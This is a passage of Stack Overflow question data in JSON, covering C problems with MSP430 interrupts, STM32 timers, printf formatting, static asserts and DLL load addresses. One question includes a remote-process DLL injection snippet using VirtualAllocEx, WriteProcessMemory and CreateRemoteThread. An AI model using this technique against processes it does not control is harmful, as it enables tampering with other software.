"https://www.gravatar.com/avatar/fcaaf0d3ee8c81eb3fcd2d01d43af680?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/7721678/dennis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 118, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1544606771, "creation_date": 1544605854, "last_edit_date": 1544606771, "question_id": 53739522, "link": "https://stackoverflow.com/questions/53739522/iar-embedded-workbench-msp430-interrupt-simulation-rejected", "title": "IAR embedded workbench MSP430 interrupt simulation rejected", "body": "<p>I've a question.\nDoes anybody know why my interrupt is rejected when I'm simulating?</p>\n\n<p>I simulate the SYSNMI_VECTOR, I've enabled the SVMLIE and SVMHIE bit.\nBut when I look in the interrupt log my interrupts are rejected. </p>\n\n<p>As initialization I do this:</p>\n\n<pre><code>  //Unlock PMM settings\n  PMMCTL0_H=PMMPW_H;\n  //Set control\n  SVSMHCTL=SVMHE|SVSMHRRL_7|SVMHFP;\n  SVSMLCTL=SVMLE|SVSMLRRL_7|SVMLFP;\n\n  //clear interrupt flags\n  PMMIFG&amp;= ~(SVMLIFG|SVMHIFG);\n\n  //setup interrupts\n  PMMRIE|= SVMLIE|SVMHIE;\n\n  //Disable PMM settings\n  PMMCTL0_H = 0x00;\n</code></pre>\n\n<p>And this is my interrupt</p>\n\n<pre><code>#pragma vector=SYSNMI_VECTOR\n__interrupt void NMI_interrupt(void) {\n//Breakpoint here\n}\n</code></pre>\n\n<p>I hope someone can help me with this. </p>\n"}, {"tags": ["c", "timer", "embedded", "stm32"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1544606853, "post_id": 53739353, "comment_id": 94332240, "body": "What it says. There is no field &quot;Init&quot; in the struct or you forgot to include the header file with the struct declaration."}, {"owner": {"reputation": 63, "user_id": 5832138, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77898ed0c9f5fc84e51f4942acb25596?s=128&d=identicon&r=PG&f=1", "display_name": "Nil", "link": "https://stackoverflow.com/users/5832138/nil"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544607260, "post_id": 53739353, "comment_id": 94332513, "body": "Updated the question"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544607461, "post_id": 53739353, "comment_id": 94332632, "body": "Probably some library path that&#39;s screwed up then. Let me guess, you are using Eclipse..."}, {"owner": {"reputation": 63, "user_id": 5832138, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77898ed0c9f5fc84e51f4942acb25596?s=128&d=identicon&r=PG&f=1", "display_name": "Nil", "link": "https://stackoverflow.com/users/5832138/nil"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544607566, "post_id": 53739353, "comment_id": 94332699, "body": "@Lundin yes, I am"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544608046, "post_id": 53739353, "comment_id": 94332989, "body": "That&#39;s perfectly normal then. The whole purpose of Eclipse is to obscure all library paths and give strange linker errors. Developers often think that the solution is to manually fiddle around with Eclipse library paths for a couple of weeks. But in fact it is far cheaper to uninstall Eclipse and buy a useful tool instead."}, {"owner": {"reputation": 63, "user_id": 5832138, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77898ed0c9f5fc84e51f4942acb25596?s=128&d=identicon&r=PG&f=1", "display_name": "Nil", "link": "https://stackoverflow.com/users/5832138/nil"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544608273, "post_id": 53739353, "comment_id": 94333101, "body": "This does not solve the problem because I have to use Eclipse"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544608731, "post_id": 53739353, "comment_id": 94333372, "body": "The problem is Eclipse itself. Trust me. I could tell that you used it just by recognizing the nature of the so-called bug, caused by the IDE itself. I have used it far too much and too often. The sooner you realize what a PoS it is, the sooner you can get back to doing actual programming."}, {"owner": {"reputation": 1473, "user_id": 6517894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0511b1daef16fed51233f70c4370dafc?s=128&d=identicon&r=PG&f=1", "display_name": "Realtime Rik", "link": "https://stackoverflow.com/users/6517894/realtime-rik"}, "edited": false, "score": 0, "creation_date": 1544614124, "post_id": 53739353, "comment_id": 94336539, "body": "This is probably just an Eclipse error and not an actual build error. You can switch these off. Working on a daily basis with IAR, KEIL, CCS, DS-5 and numerous other Eclipse based environments I have actually come to quite like Eclipse. At least it is roughly the same when switching between different tools and works pretty well once you understand it."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 1473, "user_id": 6517894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0511b1daef16fed51233f70c4370dafc?s=128&d=identicon&r=PG&f=1", "display_name": "Realtime Rik", "link": "https://stackoverflow.com/users/6517894/realtime-rik"}, "edited": false, "score": 0, "creation_date": 1544618332, "post_id": 53739353, "comment_id": 94338966, "body": "@RealtimeRik Then surely you should be able to answer this question in a few minutes. Because Eclipse doesn&#39;t create new, unique linker bugs for you to solve several times per week, at all. Right? It&#39;s so good, except for the fact that it never works."}, {"owner": {"reputation": 1473, "user_id": 6517894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0511b1daef16fed51233f70c4370dafc?s=128&d=identicon&r=PG&f=1", "display_name": "Realtime Rik", "link": "https://stackoverflow.com/users/6517894/realtime-rik"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544619040, "post_id": 53739353, "comment_id": 94339361, "body": "@Lundin I never said that it was so good. But it does work fairly well and apart from a few manufacturers most development environments seem to be going the Eclipse way. I will admit I used to hate it, but being forced to use it, as that what my customers want, it has grown on me."}, {"owner": {"reputation": 94, "user_id": 7813608, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d559ca05336093c232a87d7b1cfa90d?s=128&d=identicon&r=PG&f=1", "display_name": "David.O", "link": "https://stackoverflow.com/users/7813608/david-o"}, "edited": false, "score": 0, "creation_date": 1546529581, "post_id": 53739353, "comment_id": 94886921, "body": "Well alternative for eclipse could be simple Makefile, own text editor(vim,emacs) , gdb tools , openOCD debugger and some scripting. For very start you can find makefile based solutions at Github. Once you&#39;ll get some experience with makefiles and gdb and scripting, you&#39;ll find that it is much better than Eclipse. In this way you can control much more and your background will be much more steady. It&#39;s free like eclipse, maybe it is little harder approach, but it is worth."}, {"owner": {"reputation": 63, "user_id": 5832138, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77898ed0c9f5fc84e51f4942acb25596?s=128&d=identicon&r=PG&f=1", "display_name": "Nil", "link": "https://stackoverflow.com/users/5832138/nil"}, "reply_to_user": {"reputation": 94, "user_id": 7813608, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d559ca05336093c232a87d7b1cfa90d?s=128&d=identicon&r=PG&f=1", "display_name": "David.O", "link": "https://stackoverflow.com/users/7813608/david-o"}, "edited": false, "score": 0, "creation_date": 1551077146, "post_id": 53739353, "comment_id": 96492205, "body": "@David.O thanks a lot :)"}], "owner": {"reputation": 63, "user_id": 5832138, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77898ed0c9f5fc84e51f4942acb25596?s=128&d=identicon&r=PG&f=1", "display_name": "Nil", "link": "https://stackoverflow.com/users/5832138/nil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 229, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1544607485, "creation_date": 1544605260, "last_edit_date": 1544607485, "question_id": 53739353, "link": "https://stackoverflow.com/questions/53739353/timer-on-stm32f", "title": "Timer on STM32F", "body": "<p>I am trying to setup a general timer on a STM32F board usng HAL libraries. This is my impelementation so far:</p>\n\n<pre><code>static TIM_HandleTypeDef s_TimerInstance = { \n\u00a0\u00a0\u00a0 .Instance = TIM2\n};\n\nvoid InitializeTimer() {   \n    __TIM2_CLK_ENABLE();  \n    s_TimerInstance.Init.Prescaler = 40000;  \n    s_TimerInstance.Init.CounterMode = TIM_COUNTERMODE_UP;  \n    s_TimerInstance.Init.Period = 500;  \n    s_TimerInstance.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;  \n    s_TimerInstance.Init.RepetitionCounter = 0;  \n    HAL_TIM_Base_Init(&amp;s_TimerInstance);  \n    HAL_TIM_Base_Start(&amp;s_TimerInstance); \n}\n</code></pre>\n\n<p>I am unable to access the members of <code>s_TimerInstance</code>.</p>\n\n<blockquote>\n  <p>Field 'Init' could not be resolved</p>\n</blockquote>\n\n<p>The header files included are as follows:</p>\n\n<pre><code>#include \"stm32f0xx_hal.h\"\n#include \"stm32f072xb.h\"\n#include \"stm32f0xx_hal_tim.h\"\n</code></pre>\n\n<p>The definition of TIM_HandleTypeDef is as follows:</p>\n\n<pre><code>typedef struct\n{\n  TIM_TypeDef              *Instance;     /*!&lt; Register base address             */\n  TIM_Base_InitTypeDef     Init;          /*!&lt; TIM Time Base required parameters */\n  HAL_TIM_ActiveChannel    Channel;       /*!&lt; Active channel                    */\n  DMA_HandleTypeDef        *hdma[7];      /*!&lt; DMA Handlers array\n                                             This array is accessed by a @ref TIM_DMA_Handle_index */\n  HAL_LockTypeDef          Lock;          /*!&lt; Locking object                    */\n  __IO HAL_TIM_StateTypeDef   State;         /*!&lt; TIM operation state               */\n}TIM_HandleTypeDef;\n</code></pre>\n"}, {"tags": ["c++", "c", "printf"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544606965, "post_id": 53739294, "comment_id": 94332315, "body": "To code is nonsense and so it prints nonsense. What else did you expect? You can&#39;t print an object with <code>%p</code>. Nor does printing the contents of an uninitialized pointer print anything meaningful."}, {"owner": {"reputation": 2055, "user_id": 10733631, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-z9f47Aj3ez4/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-j0jfocyr5e1Wd0v4q8aluK_b7B5Q/mo/photo.jpg?sz=128", "display_name": "Dmytro Dadyka", "link": "https://stackoverflow.com/users/10733631/dmytro-dadyka"}, "edited": false, "score": 0, "creation_date": 1544607179, "post_id": 53739294, "comment_id": 94332455, "body": "And what is the question?"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1544607304, "post_id": 53739294, "comment_id": 94332539, "body": "This code doesn&#39;t even compile, and if it would it shouldn&#39;t give that output in realistic scenario. Please provide <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 11, "user_id": 8966373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1cc3be93d987ff1ce9ec07195f332679?s=128&d=identicon&r=PG&f=1", "display_name": "Paiya", "link": "https://stackoverflow.com/users/8966373/paiya"}, "edited": false, "score": 0, "creation_date": 1544607829, "post_id": 53739294, "comment_id": 94332854, "body": "This code will compile. Just need a difference between obj1.issue_c2 and &amp;obj1.issue_c2."}], "answers": [{"tags": [], "owner": {"reputation": 178960, "user_id": 2079303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf7f63e49a75376e0f761c8abeb6d5a?s=128&d=identicon&r=PG", "display_name": "eerorika", "link": "https://stackoverflow.com/users/2079303/eerorika"}, "is_accepted": false, "score": 1, "last_activity_date": 1544605655, "last_edit_date": 1544605655, "creation_date": 1544605249, "answer_id": 53739348, "question_id": 53739294, "link": "https://stackoverflow.com/questions/53739294/difference-between-printing-the-address-and-structure-address/53739348#53739348", "title": "Difference between printing the address and Structure address", "body": "<p>The pre-conditions of the <code>printf</code> function require that you pass a data pointer as an argument to <code>%p</code> - and more specifically, a pointer of type <code>void*</code>.</p>\n\n<p><code>obj1</code> is not a data pointer; it is an instance of <code>issue</code>. The behaviour of violating the pre-conditions of <code>printf</code> is undefined. <code>obj1.issue_c2</code> is a pointer, but it is a pointer to <code>const char</code> rather than <code>void</code>, so it also violates the pre-condition.</p>\n"}], "owner": {"reputation": 11, "user_id": 8966373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1cc3be93d987ff1ce9ec07195f332679?s=128&d=identicon&r=PG&f=1", "display_name": "Paiya", "link": "https://stackoverflow.com/users/8966373/paiya"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "closed_date": 1544607769, "answer_count": 1, "score": -8, "last_activity_date": 1544707030, "creation_date": 1544605023, "last_edit_date": 1544707030, "question_id": 53739294, "link": "https://stackoverflow.com/questions/53739294/difference-between-printing-the-address-and-structure-address", "closed_reason": "Needs details or clarity", "title": "Difference between printing the address and Structure address", "body": "<pre><code>struct issue {\n    const char *issue_c2;\n};\n\nint main {\n    struct issue obj1;\n    printf(\"obj1 of issue1 %p\\n\", &amp;obj1);\n    printf(\"obj1 of issue2 %p\\n\", obj1);\n    printf(\"obj1 of issue3 %p\\n\", obj1.issue_c2);\n    printf(\"obj1 of issue4 %p\\n\", &amp;obj1.issue_c2);\n}\n</code></pre>\n\n<p>In the above code, I tried to print the address of <code>obj1</code>. Initially I thought that the <code>obj1</code> and <code>&amp;obj1</code> prints the same address. But after printing it the addresses are different.</p>\n\n<pre><code>obj1 of issue1 0x7ffdb24c5b08\nobj1 of issue2 0x7ffdb24c5a00\nobj1 of issue3 0x7ffdb24c5b00\nobj1 of issue4 0x7ffdb24c5a10\n</code></pre>\n"}, {"tags": ["c", "perl", "printf"], "answers": [{"tags": [], "owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "is_accepted": true, "score": 6, "last_activity_date": 1544609027, "last_edit_date": 1544609027, "creation_date": 1544605873, "answer_id": 53739532, "question_id": 53738961, "link": "https://stackoverflow.com/questions/53738961/printf-how-to-align-numbers-on-decimal-point/53739532#53739532", "title": "printf: how to align numbers on decimal point", "body": "<p>The <code>[*]printf</code> function allow you to:</p>\n\n<ul>\n<li>get how much characters have been written,</li>\n<li>add some padding.</li>\n</ul>\n\n<p>So if you know how much characters are before the dot (<code>d = sprintf(buf, \"%.0f\", ar[i]);</code>), you can align the dot using (<code>printf(\"[%*s %g\", 4-d, \"\", ar[i]);</code>).</p>\n\n<p>Then same logic to align the closing bracket:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    double ar[] = {\n        1.788139343e-007,   0.0547055073198, -0.703213036125,\n       -0.583665880391,    -1.41198285298,    0.171879081676,\n       -0.58966025098,    -86.0627173425,    -0.84449797709,\n        3.49876623321e-005, 3.02660429162,   -0.256948695361};\n\n    for (int i = 0; i &lt; 12; ++i)\n    {\n        /* buffer to count how much character are before the dot*/\n        char buf[64];\n\n        /* how much before the dot? */\n        int d = sprintf(buf, \"%+.0lf\", ar[i]);\n\n        /* write float with aligned dot and store second padding */\n        int e = printf(\"[%*s %+.15lg\", 4-d, \"\", ar[i]);\n        printf(\"%*s]\\n\", 25-e, \"\");\n\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Gives:</p>\n\n<pre><code>[   +1.788139343e-07     ]\n[   +0.0547055073198     ]\n[   -0.703213036125      ]\n[   -0.583665880391      ]\n[   -1.41198285298       ]\n[   +0.171879081676      ]\n[   -0.58966025098       ]\n[  -86.0627173425        ]\n[   -0.84449797709       ]\n[   +3.49876623321e-05   ]\n[   +3.02660429162       ]\n[   -0.256948695361      ]\n</code></pre>\n"}], "owner": {"reputation": 6300, "user_id": 2331592, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/befb1bd6b66c01fed1d2384a405e6f7e?s=128&d=identicon&r=PG&f=1", "display_name": "vlad_tepesch", "link": "https://stackoverflow.com/users/2331592/vlad-tepesch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1565, "favorite_count": 1, "accepted_answer_id": 53739532, "answer_count": 1, "score": 4, "last_activity_date": 1544609027, "creation_date": 1544603614, "last_edit_date": 1544603971, "question_id": 53738961, "link": "https://stackoverflow.com/questions/53738961/printf-how-to-align-numbers-on-decimal-point", "title": "printf: how to align numbers on decimal point", "body": "<p>consider having a set of numbers:</p>\n\n<pre><code>my @array =   (\n   1.788139343e-007, 0.0547055073198, -0.703213036125,\n   -0.583665880391, -1.41198285298, +0.171879081676,\n   -0.58966025098, -86.0627173425, -0.84449797709,\n 3.49876623321e-005, 3.02660429162, -0.256948695361);\n</code></pre>\n\n<p>I would like to have the decimal point aligned at the n-th column of a total width of m (maybe n=6 and m=25)</p>\n\n<p>If using <code>%f</code> i get nicely aligned numbers, but the numbers that require an scientific notation are being destroyed.\nusging <code>%g</code> interprets the precision argument after the dot as an absolute precision that results in different decimals after the decimal point.\nAnd since the most numbers are in the range (-10, 10) I do not want to take the scientific notation <code>%e</code></p>\n\n<p>Are there any flags or format attributes (or combination of) that I overlooked? </p>\n\n<p>the expected outcome would be:</p>\n\n<pre><code>foreach my $f (@array){\n  printf(\"[%+25.12g]$/\", $f);\n}\n\n\n[   +1.788139343e-007     ]\n[   +0.0547055073198      ]\n[   -0.703213036125       ]\n[   -0.583665880391       ]\n[   -1.41198285298        ]\n[   +0.0171879081676      ]\n[   -0.58966025098        ]\n[  -86.0627173425         ]\n[   -0.84449797709        ]\n[   +3.49876623321e-005   ]\n[   +3.02660429162        ]\n[   -0.256948695361       ]\n</code></pre>\n\n<p>or even better</p>\n\n<pre><code>[   +1.7881393430000e-007 ]\n[   +0.0547055073198      ]\n[   -0.7032130361250      ]\n[   -0.5836658803910      ]\n[   -1.4119828529800      ]\n[   +0.0171879081676      ]\n[   -0.5896602509800      ]\n[  -86.0627173425000      ]\n[   -0.8444979770900      ]\n[   +3.4987662332100e-005 ]\n[   +3.0266042916200      ]\n[   -0.2569486953610      ]\n</code></pre>\n\n<p>(the question is about Perl but <code>s?printf</code>s format string is rather independent, so I also added <code>C</code> tag)</p>\n"}, {"tags": ["c", "memory", "dll", "loadlibrary", "virtualalloc"], "comments": [{"owner": {"reputation": 12461, "user_id": 266487, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/585595b6a24df9b742ebc186788e9a8e?s=128&d=identicon&r=PG", "display_name": "harper", "link": "https://stackoverflow.com/users/266487/harper"}, "edited": false, "score": 4, "creation_date": 1544603556, "post_id": 53738881, "comment_id": 94330362, "body": "The default load address in the DLL header is only a hint for the OS. WHY do you want to load the DLL to a specific address? What&#39;s wrong with the address the OS chose?"}, {"owner": {"reputation": 4251, "user_id": 4605105, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh4.googleusercontent.com/-_cFfGx1khYs/AAAAAAAAAAI/AAAAAAAAGt0/vfQ_28nwAEE/photo.jpg?sz=128", "display_name": "&#212;rel", "link": "https://stackoverflow.com/users/4605105/%c3%94rel"}, "edited": false, "score": 3, "creation_date": 1544603579, "post_id": 53738881, "comment_id": 94330373, "body": "What is your goal ? Looks like a <a href=\"https://en.wikipedia.org/wiki/XY_problem\" rel=\"nofollow noreferrer\">xy problem</a>"}, {"owner": {"reputation": 26552, "user_id": 448932, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QgLLl.png?s=128&g=1", "display_name": "500 - Internal Server Error", "link": "https://stackoverflow.com/users/448932/500-internal-server-error"}, "edited": false, "score": 0, "creation_date": 1575885688, "post_id": 53738881, "comment_id": 104702978, "body": "In the code that loads the dll, add a call to <code>GetModuleHandle()</code> on it to get its actual load address and store the result somewhere that your monitor code can get to it, say in a mapped memory section."}], "answers": [{"tags": [], "owner": {"reputation": 2634, "user_id": 8985046, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oqc2A.jpg?s=128&g=1", "display_name": "GuidedHacking", "link": "https://stackoverflow.com/users/8985046/guidedhacking"}, "is_accepted": false, "score": 0, "last_activity_date": 1580578794, "creation_date": 1580578794, "answer_id": 60019466, "question_id": 53738881, "link": "https://stackoverflow.com/questions/53738881/loading-dll-to-user-defined-address/60019466#60019466", "title": "Loading DLL to user defined address", "body": "<p>There is no reason that I can think of to require your DLL to load into a user defined address.  According to standard Windows programming practices, you should never rely on a DLL being loaded into a specific address.</p>\n\n<p>If you need to access something from the DLL at runtime, use relative offsets.  You can use <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot\" rel=\"nofollow noreferrer\">CreateToolhelp32Snapshot()</a> at runtime to get the address of the module, and then add your relative offset to get the dynamic address of whatever you need.  You can also export a function and use GetProcAddress() to get the address of the function.  Both these methods work with ASLR enabled and is the proper way to do it.</p>\n"}], "owner": {"reputation": 166, "user_id": 4990960, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fb25c925842b77bcf0ad272546f38d5d?s=128&d=identicon&r=PG&f=1", "display_name": "redumpt", "link": "https://stackoverflow.com/users/4990960/redumpt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 105, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1580578794, "creation_date": 1544603248, "last_edit_date": 1575900125, "question_id": 53738881, "link": "https://stackoverflow.com/questions/53738881/loading-dll-to-user-defined-address", "title": "Loading DLL to user defined address", "body": "<p>How to load the DLL into user define memory address or is it possible to change the DLL address after loading the DLL using <code>loadlibrary()</code> function.</p>\n\n<p>I have tried using <code>VirtualAllocEx()</code> to allocate the memory address and load DLL to the remote process. DLL is loading into the remote process but the address is not same.</p>\n\n<pre><code>//virtually allocating the memory address\nDWORD *arg = (PDWORD)VirtualAllocEx(process, /*(LPVOID)0x81200000*/0, strlen(buffer), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);\nif(arg == NULL) {\n    return 1;\n}\n\n//Write the argument to LoadLibraryA to the process's newly allocated memory region.\nint n = WriteProcessMemory(process, arg, buffer, strlen(buffer), NULL);\nif(n == 0) {\n    return 1;\n}\n\n//Inject our DLL into the process's address space.\nHANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)address, arg, NULL, NULL);\n</code></pre>\n\n<p>I have also tried using <code>rebaseimage()</code> function but memory address changing after loading the DLL.</p>\n\n<pre><code>//rebaseimage function to change the base address of the DLL\nret = ReBaseImage(\"WinMemoryDLL.dll\",\"\",TRUE,TRUE,FALSE,0,&amp;OldImage,&amp;OldImageBase,&amp;NewImageSize,&amp;NewImageBase,0);\n\nhinstLib = LoadLibrary(TEXT(\"WinMemoryDLL.dll\"));\n</code></pre>\n"}, {"tags": ["c", "constants", "static-assert"], "comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1544603915, "post_id": 53738777, "comment_id": 94330527, "body": "<code>globArr</code> is not a constant expression. Variable values are not constant expressions."}, {"owner": {"reputation": 6023, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "edited": false, "score": 0, "creation_date": 1544604306, "post_id": 53738777, "comment_id": 94330727, "body": "Why not at runtime (in debug version)? And why you need initialization with zero when it is the default value?"}, {"owner": {"reputation": 12461, "user_id": 266487, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/585595b6a24df9b742ebc186788e9a8e?s=128&d=identicon&r=PG", "display_name": "harper", "link": "https://stackoverflow.com/users/266487/harper"}, "edited": false, "score": 1, "creation_date": 1544604657, "post_id": 53738777, "comment_id": 94330906, "body": "Your static_assert shall check if your first initialization line added the <code>SPECIFIC_ADDR</code> to the member <code>.addr</code>. Your code has 6 lines above the check the correct value assigned. What do you want to assert? If somebody changes the initialization list, she can change the static assert too."}, {"owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "reply_to_user": {"reputation": 6023, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "edited": false, "score": 0, "creation_date": 1544604717, "post_id": 53738777, "comment_id": 94330942, "body": "@i486 This is just an example. You can ignore the initialization with 0."}, {"owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "reply_to_user": {"reputation": 12461, "user_id": 266487, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/585595b6a24df9b742ebc186788e9a8e?s=128&d=identicon&r=PG", "display_name": "harper", "link": "https://stackoverflow.com/users/266487/harper"}, "edited": false, "score": 0, "creation_date": 1544604868, "post_id": 53738777, "comment_id": 94331023, "body": "@harper Right. But if someone adds entries to the <code>globArr</code> and then fails on compilation, it will indicate that the static assert was not added just for fun but there is a reason and probably, the most logical way would be either to dig and understand why it was added or just keep the SPECIFIC_ADDR at SPECIFIC_ADDR_IDX. Also note that this is just an example. In the real project the array is much bigger, not just 6 lines as you see here."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1544605686, "post_id": 53738777, "comment_id": 94331465, "body": "You could add comments next to relevant lines explaining the restrictions. It&#39;s not as good as assertion, but will raise warning flags to someone who&#39;s not a completely incompetent."}, {"owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "reply_to_user": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1544605821, "post_id": 53738777, "comment_id": 94331547, "body": "@user694733 Thanks! That&#39;s what I have today, just a comment. The problem with comments is that they has to be maintained too and once there many comments, people just tend to ignore them. That&#39;s why I am looking for something <i>stronger</i> than just a comment."}], "answers": [{"comments": [{"owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "edited": false, "score": 1, "creation_date": 1544605330, "post_id": 53739166, "comment_id": 94331268, "body": "Thanks for your answer. Checking it at runtime is the obvious thing but I don&#39;t want to perform this check all the time when I pass through a specific code due to performance issues and also there is no reason to check it all the time. Also the testing of that specific flow might take some time and when the assert raises it might be few days after the code is 